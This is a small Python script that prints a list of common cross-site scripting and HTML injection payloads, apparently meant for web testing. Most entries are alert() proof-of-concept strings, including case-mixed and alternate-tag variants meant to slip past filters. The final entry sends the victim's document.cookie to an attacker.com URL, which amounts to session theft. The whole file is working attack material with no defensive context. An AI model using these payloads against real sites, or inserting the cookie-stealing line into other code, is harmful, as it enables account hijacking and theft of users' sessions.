#!/usr/bin/env python3

def generate_payloads():
    payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "javascript:alert(1)",
        "';alert(1)//",
        "\"><script>alert(1)</script>",
        "<ScRiPt>alert(1)</sCrIpT>",
        "<svg/onload=alert(1)>",
        "<details/open/ontoggle=alert(1)>",
        "document.location='http://attacker.com/steal?c='+document.cookie"
    ]
    
    print("--- Common XSS/HTMLi Payloads ---")
    for p in payloads:
        print(p)

if __name__ == "__main__":
    generate_payloads()
